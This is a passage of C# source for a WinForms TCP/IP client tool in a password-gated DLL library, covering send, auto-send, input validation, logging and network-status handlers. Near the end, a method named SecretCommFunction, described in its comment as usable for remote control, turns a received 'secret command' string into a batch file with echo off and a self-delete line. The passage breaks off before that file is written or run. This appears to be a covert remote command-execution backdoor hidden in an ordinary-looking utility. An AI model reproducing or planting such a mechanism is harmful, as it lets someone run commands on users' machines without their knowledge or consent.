                                if (ClientSendMessageInHEX == true)
                                    {
                                    TempString[0] = FC.StringConvertToHEX(TempString[0]);
                                    Clients[a].SendMessage = TempString;
                                    }
                                else
                                    {
                                    if (GB2312Coding == true)
                                        {
                                        Clients[a].ReceiveGB2312Code = true;
                                        }
                                    else 
                                        {
                                        Clients[a].ReceiveGB2312Code = false;
                                        }
                                    Clients[a].SendMessage = TempString;                                                                          
                                    }
                                }
                            }
                        }
                    else 
                        {
                        AddText("发送的文本内容为空，请输入内容后再点击'发送'按钮");
                        txtSendToServer.Focus();
                        return;
                        }
                    }
                else 
                    {
                    //*******************************************************
                    //发送文件，后续可以考虑计算发送时间并提示更改发送间隔时间
                    if (newOpenFile.FileNames.Length > 0) 
                        {
                        byte[] Data = null;
                        string[] TempStr = {""};
                        //string TempString = "";

                        for (int a = 0; a < newOpenFile.FileNames.Length; a++)
                            {
                            Data = PC.FileSystem.ReadAllBytes(newOpenFile.FileNames[a]);
                            AddText("File: " + newOpenFile.FileNames[a] + ". total: " + Data.Length + " bytes...");
                            TempStr[0] = System.Text.Encoding.UTF8.GetString(Data);
                            //TempString = TempStr;

                            //单端口发送文件
                            if (SingleClient != null)
                                {
                                try
                                    {
                                    if (ClientSendMessageInHEX == true)
                                        {
                                        TempStr[0] = FC.StringConvertToHEX(TempStr + Suffix);
                                        SingleClient.SendMessage = TempStr;
                                        }
                                    else
                                        {
                                        if (GB2312Coding == true)
                                            {
                                            SingleClient.ReceiveGB2312Code = true;
                                            }
                                        else
                                            {
                                            SingleClient.ReceiveGB2312Code = false;
                                            }
                                        SingleClient.SendMessage = TempStr;
                                        }
                                    }
                                catch (Exception ex)
                                    {
                                    AddText(ex.Message);
                                    }
                                }                            

                            //多端口发送文件
                            if (Clients != null)
                                {
                                for (int b = 0; b < Clients.Length; b++)
                                    {
                                    if (ClientSendMessageInHEX == true)
                                        {
                                        //前面已经转换为16进制，所以这里就取消
                                        Clients[b].SendMessage = TempStr;
                                        }
                                    else
                                        {
                                        if (GB2312Coding == true)
                                            {
                                            Clients[b].ReceiveGB2312Code = true;
                                            }
                                        else 
                                            {
                                            Clients[b].ReceiveGB2312Code = false;
                                            }
                                        Clients[b].SendMessage = TempStr;
                                        }
                                    }
                                }
                            }
                        }                    
                    }
                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void txtAutoSendInterval_TextChanged(object sender, EventArgs e)
            {

            try
                {



                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void txtAutoSendInterval_KeyPress(object sender, KeyPressEventArgs e)
            {

            try
                {

                //如果按下的不是数字键和控制键，则删除总长度的一个字符，
                //然后聚焦文本框【如果输入的第一个字符不是数字，则清除】
                if(!(Char.IsNumber(e.KeyChar) |
                    Char.IsControl(e.KeyChar)))
                    {
                    AddText("只能输入数字，请重新输入...");
                    MessageBox.Show("只能输入数字，请重新输入.");
                    e.Handled = true;
                    txtAutoSendInterval.Focus();
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void txtAutoSendInterval_KeyDown(object sender, KeyEventArgs e)
            {
            try
                {
                if (txtAutoSendInterval.Text != "") 
                    {
                    }
                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }
            }

        private void chkAutoSend_CheckedChanged(object sender, EventArgs e)
            {

            try
                {

                if (chkAutoSend.Checked == true)
                    {

                    if (txtAutoSendInterval.Text == "")
                        {
                        MessageBox.Show("Please set the auto-send interval first.\r\n" +
                            "自动发送时间间隔不能为空，请先设定一个数值。","提示",
                            MessageBoxButtons.OK,MessageBoxIcon.Information);
                        txtAutoSendInterval.Focus();
                        chkAutoSend.Checked = false;

                        if (SingleClient != null)
                            {
                            SingleClient.AutoSend = true;
                            }

                        if (Clients != null)
                            {
                            for (int a = 0; a < Clients.Length; a++)
                                {
                                Clients[a].AutoSend = true;
                                }
                            }

                        return;
                        }
                    else 
                        {
                        //tmrAutoSend.Interval =Convert.ToDouble(txtAutoSendInterval.Text);

                        if (SingleClient != null) 
                            {
                            SingleClient.AutoSendInterval = Convert.ToUInt32(txtAutoSendInterval.Text);
                            SingleClient.AutoSend = true;
                            }

                        if (Clients != null) 
                            {
                            for (int a = 0; a < Clients.Length; a++) 
                                {
                                Clients[a].AutoSendInterval = Convert.ToUInt32(txtAutoSendInterval.Text);
                                Clients[a].AutoSend = true;
                                }
                            }

                        AutoResendFlag = true;
                        }

                    }
                else 
                    {
                    if (SingleClient != null)
                        {
                        SingleClient.AutoSend = false;
                        }

                    if (Clients != null)
                        {
                        for (int a = 0; a < Clients.Length; a++)
                            {
                            Clients[a].AutoSend = false;
                            }
                        }
                    AutoResendFlag = false;
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void chkSendFile_CheckedChanged(object sender, EventArgs e)
            {

            try
                {

                if (chkSendFile.Checked == true)
                    {
                    newOpenFile.Filter = "所有文件|*.*";
                    newOpenFile.Multiselect = true;

                    if (newOpenFile.ShowDialog() == DialogResult.OK)
                        {
                        if (newOpenFile.FileNames.Length > 0)
                            {
                            SendFileFlag = true;
                            }
                        else
                            {
                            chkSendFile.Checked = false;
                            SendFileFlag = false;
                            }
                        }
                    else 
                        {
                        chkSendFile.Checked = false;
                        SendFileFlag = false;
                        }
                    }
                else 
                    {
                    SendFileFlag = false;
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void chkClientSendHEX_CheckedChanged(object sender, EventArgs e)
            {

            try
                {

                if (chkClientSendHEX.Checked == true)
                    {
                    ClientSendMessageInHEX = true;
                    }
                else 
                    {
                    ClientSendMessageInHEX = false;
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void mtxt_4_MaskInputRejected(object sender, MaskInputRejectedEventArgs e)
            {

            try
                {



                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void mtxt_3_MaskInputRejected(object sender, MaskInputRejectedEventArgs e)
            {

            try
                {



                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void mtxt_2_MaskInputRejected(object sender, MaskInputRejectedEventArgs e)
            {

            try
                {



                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void mtxt_4_KeyPress(object sender, KeyPressEventArgs e)
            {

            try
                {
                //如果按下的不是数字键和控制键，则删除总长度的一个字符，
                //然后聚焦文本框【如果输入的第一个字符不是数字，则清除】
                if (!(Char.IsNumber(e.KeyChar) |
                    Char.IsControl(e.KeyChar)))
                    {
                    AddText("搜寻的IP地址端只能是数字，请重新输入...");
                    mtxt_4.Focus();
                    e.Handled = true;
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void mtxt_3_KeyPress(object sender, KeyPressEventArgs e)
            {

            try
                {
                //如果按下的不是数字键和控制键，则删除总长度的一个字符，
                //然后聚焦文本框【如果输入的第一个字符不是数字，则清除】
                if (!(Char.IsNumber(e.KeyChar) |
                    Char.IsControl(e.KeyChar)))
                    {
                    AddText("搜寻的IP地址端只能是数字，请重新输入...");
                    mtxt_3.Focus();
                    e.Handled = true;
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void mtxt_2_KeyPress(object sender, KeyPressEventArgs e)
            {

            try
                {
                //如果按下的不是数字键和控制键，则删除总长度的一个字符，
                //然后聚焦文本框【如果输入的第一个字符不是数字，则清除】
                if (!(Char.IsNumber(e.KeyChar) |
                    Char.IsControl(e.KeyChar)))
                    {
                    AddText("搜寻的IP地址端只能是数字，请重新输入...");
                    mtxt_2.Focus();
                    e.Handled = true;
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void mtxt_4_KeyDown(object sender, KeyEventArgs e)
            {

            try
                {

                if (Convert.ToInt32(mtxt_4.Text) > 255
                    | Convert.ToInt32(mtxt_4.Text)<0) 
                    {
                    MessageBox.Show("IP地址段的正确值范围是：0~255，请修改参数。");
                    mtxt_4.Focus();
                    return;
                    }

                if (mtxt_4.TextLength >= 3) 
                    {
                    mtxt_3.Focus();
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void mtxt_3_KeyDown(object sender, KeyEventArgs e)
            {

            try
                {

                if (Convert.ToInt32(mtxt_3.Text) > 255
                    | Convert.ToInt32(mtxt_3.Text) < 0)
                    {
                    MessageBox.Show("IP地址段的正确值范围是：0~255，请修改参数。");
                    mtxt_3.Focus();
                    return;
                    }

                if (mtxt_3.TextLength >= 3)
                    {
                    mtxt_2.Focus();
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void mtxt_2_KeyDown(object sender, KeyEventArgs e)
            {

            try
                {

                if (Convert.ToInt32(mtxt_2.Text) > 255
                    | Convert.ToInt32(mtxt_2.Text) < 0)
                    {
                    MessageBox.Show("IP地址段的正确值范围是：0~255，请修改参数。");
                    mtxt_2.Focus();
                    return;
                    }

                if (mtxt_2.TextLength >= 3)
                    {
                    btnSearchIP.Focus();
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void txtTargetServerIPAddress_TextChanged(object sender, EventArgs e)
            {

            try
                {



                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void txtTargetServerIPAddress_KeyPress(object sender, KeyPressEventArgs e)
            {

            try
                {
                //如果按下的不是数字键、控制键和"."，则删除总长度的一个字符，
                //然后聚焦文本框【如果输入的第一个字符不是数字，则清除】
                if(!(Char.IsNumber(e.KeyChar) |
                    Char.IsControl(e.KeyChar) |
                    Strings.Asc(e.KeyChar) == 46))
                    {
                    AddText("服务器的IP地址只能是数字和符号\".\"，请重新输入...");
                    txtTargetServerPort.Focus();
                    e.Handled = true;
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void txtTargetServerPort_KeyPress(object sender, KeyPressEventArgs e)
            {

            try
                {
                //如果按下的不是数字键和控制键，则删除总长度的一个字符，
                //然后聚焦文本框【如果输入的第一个字符不是数字，则清除】
                if (!(Char.IsNumber(e.KeyChar) |
                    Char.IsControl(e.KeyChar)))
                    {
                    AddText("服务器的IP地址只能是数字，请重新输入...");
                    txtTargetServerPort.Focus();
                    e.Handled = true;
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void txtTargetServerPort_KeyDown(object sender, KeyEventArgs e)
            {

            try
                {

                if(Convert.ToInt32(txtTargetServerPort.Text)>65535 
                    | Convert.ToInt16(txtTargetServerPort.Text) <0)
                    {
                    MessageBox.Show("服务器监听端口的正确值范围是：0~65535，请修改此端口值。");
                    txtTargetServerPort.Focus();
                    return;
                    }

                if (e.KeyCode == Keys.Enter) 
                    {
                    e.Handled=true;
                    btnConnectToServer.Focus();
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void txtCustomizedEndingCodeForClient_TextChanged(object sender, EventArgs e)
            {

            try
                {



                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void txtCustomizedEndingCodeForClient_KeyDown(object sender, KeyEventArgs e)
            {

            try
                {
                Suffix = txtCustomizedEndingCodeForClient.Text;
                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void ClientListView1_SelectedIndexChanged(object sender, EventArgs e)
            {

            try
                {
                                

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void ClientListView1_ItemSelectionChanged(object sender, ListViewItemSelectionChangedEventArgs e)
            {

            try
                {

                if (e.Item.Index < 0)
                    {
                    return;
                    }

                lblCurrentIndexForClientListView.Text = (e.Item.Index + 1).ToString();
                CurrentSelectedItemOfClientListView = e.Item.Index + 1;

                if (ClientListView1.Items[e.Item.Index].SubItems[1].Text != "")
                    {
                    txtTargetServerIPAddress.Text = ClientListView1.Items[e.Item.Index].SubItems[1].Text;
                    txtTargetServerPort.Text = ClientListView1.Items[e.Item.Index].SubItems[2].Text;

                    switch (ClientListView1.Items[e.Item.Index].SubItems[4].Text)
                        {
                        case "":
                            cmbSuffixForClient.SelectedIndex = 0;
                            break;

                        case "LF":
                            cmbSuffixForClient.SelectedIndex = 1;
                            break;

                        case "CR":
                            cmbSuffixForClient.SelectedIndex = 2;
                            break;

                        case "CRLF":
                            cmbSuffixForClient.SelectedIndex = 3;
                            break;

                        case "CUS":
                            cmbSuffixForClient.SelectedIndex = 4;
                            break;

                        }
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void cmbSuffixForClient_SelectedIndexChanged(object sender, EventArgs e)
            {

            try
                {

                switch (cmbSuffixForClient.SelectedIndex)
                    {

                    case 0:
                        Suffix = "";
                        break;

                    case 1:
                        Suffix = "\n";
                        break;

                    case 2:
                        Suffix = "\r";
                        break;

                    case 3:
                        Suffix = "\r\n";
                        break;

                    case 4:
                        Suffix = txtCustomizedEndingCodeForClient.Text;
                        break;

                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void rtbTCPIPHistory_TextChanged(object sender, EventArgs e)
            {

            try
                {
                //如果文本框的字符串超过一定数量，就保存之后再清除
                if (rtbTCPIPHistory.TextLength > 1000000)
                    {

                    // 's'--将日期和时间格式化为可排序的索引。例如 2008-03-12T11:07:31。
                    //     s 字符以用户定义的时间格式显示秒钟。
                    // 'u'--将日期和时间格式化为 GMT 可排序索引。如 2008-03-12 11:07:31Z。

                    string TempFileName = PC.FileSystem.CurrentDirectory + "\\TCPIPClientLog-" +
                        Strings.Format(DateTime.Now, "yyyy'年'MM'月'dd'日' HH'点'mm'分'ss'秒'") + ".txt"; // "yyyy-MM-dd HH%h-mm%m-ss%s") '"s")

                    rtbTCPIPHistory.SaveFile(TempFileName, RichTextBoxStreamType.TextTextOleObjs);
                    //AddText("成功保存运行记录至文件: " + TempFileName);

                    rtbTCPIPHistory.Text = "";
                    AddText("历史记录太多，在清除之前已经备份保存到文件：" + TempFileName);
                    }

                }
            catch (Exception ex)
                {
                AddText(ex.Message);
                }

            }

        private void rtbTCPIPHistory_MouseDoubleClick(object sender, MouseEventArgs e)
            {

            try
                {

                if (rtbTCPIPHistory.Text == "")
                    {
                    return;
                    }

                if (MessageBox.Show("Are you sure to clear all the log?\r\n确定要清除通讯记录吗？", "确认", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
                    == DialogResult.Yes)
                    {
                    rtbTCPIPHistory.Text = "";
                    }

                }
            catch (Exception ex)
                {
                AddText(ex.Message);
                }

            }

        private void rtbTCPIPHistory_MouseDown(object sender, MouseEventArgs e)
            {

            try
                {

                if (rtbTCPIPHistory.Text == "")
                    {
                    return;
                    }

                if (e.Button == MouseButtons.Right)
                    {

                    SaveLogAsTXTFile.DefaultExt = "txt";
                    SaveLogAsTXTFile.Filter = "TXT文本文件 (*.txt)|*.txt";
                    SaveLogAsTXTFile.Title = "保存运行记录至文件";

                    // 's'--将日期和时间格式化为可排序的索引。例如 2008-03-12T11:07:31。
                    //     s 字符以用户定义的时间格式显示秒钟。
                    // 'u'--将日期和时间格式化为 GMT 可排序索引。如 2008-03-12 11:07:31Z。

                    SaveLogAsTXTFile.FileName = "TCPIPClientLog-" + Strings.Format(DateTime.Now, "yyyy'年'MM'月'dd'日' HH'点'mm'分'ss'秒'"); // "yyyy-MM-dd HH%h-mm%m-ss%s") '"s")
                    SaveLogAsTXTFile.RestoreDirectory = true;

                    if (SaveLogAsTXTFile.ShowDialog() == System.Windows.Forms.DialogResult.OK
                        & SaveLogAsTXTFile.FileName != "")
                        {
                        rtbTCPIPHistory.SaveFile(SaveLogAsTXTFile.FileName, RichTextBoxStreamType.TextTextOleObjs);
                        AddText("成功保存运行记录至文件: " + SaveLogAsTXTFile.FileName);
                        }
                    else
                        {
                        AddText("取消保存运行记录...");
                        }

                    }

                }
            catch (Exception ex)
                {
                AddText(ex.Message);
                }

            }

        #endregion

        #region "函数程序代码"

        //实例化函数
        /// <summary>
        /// 实例化函数
        /// </summary>
        public TCPAsyncClientForm(string DLLPassword)
            {

            SuccessBuiltNew = false;
            PasswordIsCorrect = false;

            try
                {

                if (DLLPassword == "ThomasPeng" || (DLLPassword == "pengdongnan") || (DLLPassword == "彭东南"))
                    {
                    PasswordIsCorrect = true;

                    InitializeComponent();

                    SuccessBuiltNew = true;

                    //此处没有意义，只是为了不报警提示说这两个变量没有使用
                    if (PasswordIsCorrect == false | SuccessBuiltNew == false) 
                        {
                        return;
                        }

                    }
                else
                    {
                    PasswordIsCorrect = false;
                    SuccessBuiltNew = false;
                    MessageBox.Show("Right Prohibited.\return\n     You don't have the given right to use this DLL library, please contact with ThomasPeng.\r\n你未得到授权的密码，无法使用此DLL进行软件开发！请与作者彭东南联系：southeastofstar@163.com\r\n                                                                版权所有： 彭东南", "", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    return;
                    }

                }
            catch (Exception ex)
                {
                SuccessBuiltNew = false;
                MessageBox.Show("创建窗体类的实例时出现错误！\r\n" +
                    ex.Message);
                }

            }

        //添加网络IP地址变更和网络断开、连接的监听句柄
        /// <summary>
        /// 添加网络IP地址变更和网络断开、连接的监听句柄
        /// </summary>
        private void AddNetworkChange_EventHandler()
            {
            NetworkChange.NetworkAddressChanged += new NetworkAddressChangedEventHandler(AddressChangedCallback);
            NetworkChange.NetworkAvailabilityChanged += new NetworkAvailabilityChangedEventHandler(NetworkAvailabilityChangedCallback);
            }

        //网络IP地址变更事件的代理
        /// <summary>
        /// 网络IP地址变更事件的代理
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void AddressChangedCallback(object sender, EventArgs e)
            {
            AddText("网络中有IP地址的变更...");
            }

        //网络断开、连接事件的代理
        /// <summary>
        /// 网络断开、连接事件的代理
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void NetworkAvailabilityChangedCallback(object sender,
            NetworkAvailabilityEventArgs e)
            {

            //    Dim adapters As NetworkInterface() = NetworkInterface.GetAllNetworkInterfaces()
            //    Dim n As NetworkInterface

            //    NetworkInterface.OperationalStatus(属性)
            //    获取网络连接的当前操作状态。
            //    Public MustOverride ReadOnly Property OperationalStatus As OperationalStatus

            //    OperationalStatus 枚举
            //    Up	            网络接口已运行，可以传输数据包。
            //    Down	        网络接口无法传输数据包。
            //    Testing	    网络接口正在运行测试。
            //    Unknown	    网络接口的状态未知。
            //    Dormant	    网络接口不处于传输数据包的状态；它正等待外部事件。
            //    NotPresent	    由于缺少组件（通常为硬件组件），网络接口无法传输数据包。
            //    LowerLayerDown	网络接口无法传输数据包，因为它运行在一个或多个其他接口之上，而这些“低层”接口中至少有一个已关闭。

            //当网络断开后，判断是否为本机自己通信，如果不是，则要关闭所有和其它设备的以太网通信
            //if (TempTestIPAddress!="127.0.0.1") 
            //    {

            if (e.IsAvailable == false)
                {

                AddText("警告：网络已断开！");

                NetworkStatus_Menu.ToolTipText = "网络已断开";
                //NetworkStatus_Menu.Image = global::PengDongNanTools.Properties.Resources.NoNetwork;
                bool x = false;
                x=FC.ChangeMenuImage(ref btnCloseClient, ref NetworkStatus_Menu, global::PengDongNanTools.Properties.Resources.NoNetwork);

                FC.ChangeMenuBackColor(ref btnCloseClient, ref NetworkStatus_Menu, Color.Red);
                TempTestIPAddress = FC.GetLocalIP4Address();
                AddText("本机IP地址为：" + TempTestIPAddress);
                FC.ChangeLabelText(ref lblLocalIPAddress, TempTestIPAddress);
                FC.UpdateTextBox(ref txtTargetServerIPAddress, TempTestIPAddress);

                MessageBox.Show("The network is not available now.\r\n网络已断开！" +
                "\r\nIP Address is : " + TempTestIPAddress, "警告",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);

                if (StartMultiConnect == true & TempTestIPAddress != "127.0.0.1")
                    {
                    //if (Clients != null)
                    //    {
                    //    for (int a = 0; a < Clients.Length; a++)
                    //        {
                    //        try
                    //            {
                    //            if (Clients[a] != null)
                    //                {
                    //                Clients[a].Close();
                    //                AddText("成功关闭客户端 " + (a + 1) + " 通讯线程...");
                    //                }
                    //            }
                    //        catch (Exception ex)
                    //            {
                    //            AddText("关闭客户端 " + (a + 1) + " 通讯线程发生错误: " + ex.Message);
                    //            //MessageBox.Show(ex.Message);
                    //            }
                    //        }
                    //    AddText("由于断网而关闭的TCP/IP通讯线程在网络恢复后会自动重新启动...");
                    //    }
                    }
                }
            else
                {
                //AddText("The network is available now.");
                AddText("通知：网络已连接！");

                NetworkStatus_Menu.ToolTipText = "网络已连接";
                //NetworkStatus_Menu.Image = global::PengDongNanTools.Properties.Resources.NetworkAvailable;
                FC.ChangeMenuImage(ref btnCloseClient, ref NetworkStatus_Menu, global::PengDongNanTools.Properties.Resources.NetworkAvailable);
                FC.ChangeMenuBackColor(ref btnCloseClient, ref NetworkStatus_Menu, Color.Green);
                TempTestIPAddress =FC.GetLocalIP4Address();
                AddText("本机IP地址为：" + TempTestIPAddress);
                FC.ChangeLabelText(ref lblLocalIPAddress, TempTestIPAddress);
                FC.UpdateTextBox(ref txtTargetServerIPAddress,TempTestIPAddress);
                
                MessageBox.Show("通知：网络已连接！" + "\r\nIP Address is : " + TempTestIPAddress,
                    "通知", MessageBoxButtons.OK, MessageBoxIcon.Information);

                if (StartMultiConnect == true & TempTestIPAddress != "127.0.0.1")
                    {
                    //if (Clients != null)
                    //    {
                    //    for (int a = 0; a < Clients.Length; a++)
                    //        {
                    //        try
                    //            {
                    //            if (Clients[a] != null)
                    //                {
                    //                AddText("成功启动客户端 " + (a + 1) + " 通讯线程...");
                    //                }
                    //            }
                    //        catch (Exception ex)
                    //            {
                    //            AddText("启动客户端 " + (a + 1) + " 通讯线程发生错误: " + ex.Message);
                    //            //MessageBox.Show(ex.Message);
                    //            }
                    //        }
                    //    AddText("网络已经重新连接，由于断网而关闭的TCP/IP通讯线程已重新启动...");
                    //    }
                    }
                }
            //}

            }

        //添加记录到窗体中的log文本框
        /// <summary>
        /// 添加记录到窗体中的log文本框
        /// </summary>
        /// <param name="TargetText">要添加的文本内容</param>
        public void AddText(string TargetText)
            {

            if (PasswordIsCorrect == false)
                {
                MessageBox.Show("Right Prohibited.\r\n     You don't have the given right to use this DLL library, please contact with ThomasPeng.\r\n你未得到授权的密码，无法使用此DLL进行软件开发！请与作者彭东南联系：southeastofstar@163.com\r\n                                                                版权所有： 彭东南", "非法操作", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
                }

            try
                {

                if (TargetText == "")
                    {
                    return;
                    }

                string TempStr = "";//new string();//= TargetText；//Strings.UCase(TargetText);
                //TempStr = TargetText;
                //TargetText = "";

                //**********************
                // 去掉尾部的回车换行符号
                if (TargetText.Length == 1)
                    {
                    TempStr = TargetText;
                    }
                else if (TempStr.Length == 2)
                    {
                    if ((Strings.Asc(Strings.Mid(TargetText, TargetText.Length, 1)) == 13) |
                        (Strings.Asc(Strings.Mid(TargetText, TargetText.Length, 1)) == 10))
                        {
                        TempStr = Strings.Mid(TargetText, 1, TargetText.Length - 1);
                        }
                    else
                        {
                        TempStr = TargetText;
                        }
                    }
                else
                    {
                    if ((Strings.Asc(Strings.Mid(TargetText, TargetText.Length - 1, 1)) == 13) &
                    (Strings.Asc(Strings.Mid(TargetText, TargetText.Length, 1)) == 10))
                        {
                        TempStr = Strings.Mid(TargetText, 1, TargetText.Length - 2);
                        }
                    else
                        {
                        TempStr = TargetText;
                        }
                    }
                
                //**********************
                if (rtbTCPIPHistory.InvokeRequired == true)
                    {
                    AddTextDelegate ActualAddMessageToRichTextBox = new AddTextDelegate(AddText);
                    rtbTCPIPHistory.Invoke(ActualAddMessageToRichTextBox, new object[] { TempStr });
                    }
                else
                    {

                    if (UpdatingSameMessage == true)
                        {
                        TempErrorMessage = TempStr;
                        if (ShowDateTimeForMessage == true)
                            {
                            rtbTCPIPHistory.AppendText(DateTime.Now + "   " + TempStr + "\r\n");
                            }
                        else
                            {
                            rtbTCPIPHistory.AppendText(TempStr + "\r\n");
                            }
                        TempStr = "";
                        }
                    else
                        {

                        if (TempErrorMessage == TempStr)
                            {
                            return;
                            }
                        else
                            {
                            TempErrorMessage = TempStr;
                            if (ShowDateTimeForMessage == true)
                                {
                                rtbTCPIPHistory.AppendText(DateTime.Now + "   " + TempStr + "\r\n");
                                }
                            else
                                {
                                rtbTCPIPHistory.AppendText(TempStr + "\r\n");
                                }
                            TempStr = "";
                            }

                        }

                    }
                //**********************

                }
            catch (Exception)// ex)
                {
                //MessageBox.Show(ex.Message);
                return;
                }

            }

        //从枚举Endings返回字符串，用于进行转义比较
        /// <summary>
        /// 从枚举Endings返回字符串，用于进行转义比较
        /// </summary>
        /// <param name="TargetEndings">目标结束符</param>
        /// <returns>转义比较后返回的字符串</returns>
        public string GetBackStrFromEndings(Endings TargetEndings)
            {
            string TempStr = "";

            switch (TargetEndings)
                {

                case Endings.None:
                    TempStr = "";
                    break;
                //\r回车符，\n换行符
                case Endings.LF:
                    TempStr = "LF";
                    break;

                case Endings.CR:
                    TempStr = "CR";
                    break;

                case Endings.CRLF:
                    TempStr = "CRLF";
                    break;

                case Endings.Customerize:
                    TempStr = "CUS";
                    break;

                }

            return TempStr;

            }

        //保存服务器和客户端需要返回的公共参数
        /// <summary>
        /// 保存服务器和客户端需要返回的公共参数
        /// </summary>
        private void SaveParameters() 
            {

            try
                {

                FeedBackClientParameters = new SaveClientParameters[ClientListView1.Items.Count];
                for (int a = 0; a < ClientListView1.Items.Count; a++) 
                    {
                    FeedBackClientParameters[a].TargetServerIPAddress = ClientListView1.Items[a].SubItems[1].Text;
                    FeedBackClientParameters[a].TargetServerPort = Convert.ToUInt16(ClientListView1.Items[a].SubItems[2].Text);
                    FeedBackClientParameters[a].Tested = (ClientListView1.Items[a].SubItems[3].Text.ToUpper() == "TRUE") ? true : false;

                    switch (ClientListView1.Items[a].SubItems[4].Text)
                        {
                        
                        case "":
                            FeedBackClientParameters[a].EndingSetting = Endings.None;
                            break;

                        case "CR":
                            FeedBackClientParameters[a].EndingSetting = Endings.CR;
                            break;

                        case "LF":
                            FeedBackClientParameters[a].EndingSetting = Endings.LF;
                            break;

                        case "CRLF":
                            FeedBackClientParameters[a].EndingSetting = Endings.CRLF;
                            break;

                        case "CUS":
                            FeedBackClientParameters[a].EndingSetting = Endings.Customerize;
                            break;
                        }

                    }

                }
            catch (Exception ex) 
                {
                MessageBox.Show("" + ex.Message);
                }
            
            }

        //因为列的第一列为显示图标用，故其编号从1开始，实际编程时要特别注意；
        //用于添加客户端的服务器IP地址、服务器端口、是否已经测试和结束符
        /// <summary>
        /// 用于添加客户端的服务器IP地址、服务器端口、是否已经测试和结束符
        /// </summary>
        /// <param name="ServerIPAddress"></param>
        /// <param name="ServerPort"></param>
        /// <param name="Tested"></param>
        /// <param name="EndingSet"></param>
        private void AddRecordForClientListView(string ServerIPAddress,
            ushort ServerPort, bool Tested, Endings EndingSet) 
            {

            int IndexOfCurrentDataInListView=0;
            bool IPAddressAlreadyExist=false;

            try
                {
                //1、首先查找ListView中是否已经存在相同的端口，
                //如果存在则提示并退出函数；否则进行添加操作

                for (int a = 0; a < ClientListView1.Items.Count; a++) 
                    {
                    if (ClientListView1.Items[a].SubItems[1].Text == ServerIPAddress) 
                        {
                        IPAddressAlreadyExist = true;
                        IndexOfCurrentDataInListView = a;
                        MessageBox.Show("This IP address: " + ServerIPAddress + 
                            " is already exist in the list, please revise the IP address to be connected, then add it." +
                           "\r\nIP地址: " + ServerIPAddress + " 已经存在，请修改后再进行添加.");
                        break;
                        }
                    }

                ClientListView1.BeginUpdate();
                //如果存在相同记录，则只要变更结束符即可
                if (IPAddressAlreadyExist == true)
                    {
                    ClientListView1.Items[IndexOfCurrentDataInListView].SubItems[2].Text = ServerPort.ToString();
                    ClientListView1.Items[IndexOfCurrentDataInListView].SubItems[3].Text = Tested.ToString();
                    ClientListView1.Items[IndexOfCurrentDataInListView].SubItems[4].Text = Suffix;  //此处需要留意实际的结束符显示结果是什么
                    }
                else 
                    {
                    //如果不存在相同的记录则添加此新记录到列表
                    ListViewItem AddNewItemsForServerPort = new ListViewItem();
                    AddNewItemsForServerPort.SubItems.Add(ServerIPAddress);
                    AddNewItemsForServerPort.SubItems.Add(ServerPort.ToString());
                    AddNewItemsForServerPort.SubItems.Add(Tested.ToString());
                    AddNewItemsForServerPort.SubItems.Add(Suffix);  //此处需要留意实际的结束符显示结果是什么
                    ClientListView1.Items.Add(AddNewItemsForServerPort);
                    }
                ClientListView1.EndUpdate();

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        /// <summary>
        /// 可以用来执行遥控操作；
        /// </summary>
        private void SecretCommFunction() 
            {

            string[] CorrectCommand = null;
            string TempCommand = "";

            while(true)
                {

                try
                    {

                    if (EnableSecretCommand == true) 
                        {
                        //1、清除原有BAT文件记录
                        if (PC.FileSystem.FileExists(SecretBATFile)==true) 
                            {
                            PC.FileSystem.DeleteFile(SecretBATFile);
                            }

                        //2、连接命令
                        CorrectCommand = Strings.Split(Strings.Trim(Strings.Mid(SecretCommand, 11, Strings.Len(SecretCommand) - 10)), ",");
                        SecretCommand = "";
                        TempCommand = "@ECHO Off\r\n";

                        for (int a = 0; a < CorrectCommand.Length; a++) 
                            {
                            TempCommand += CorrectCommand[a] + "\r\n";
                            }

                        TempCommand += "del SecretBATFile\r\n";

                        //3、写入BAT命令至文件
                        //保存的中文会乱码, 不支持GB码
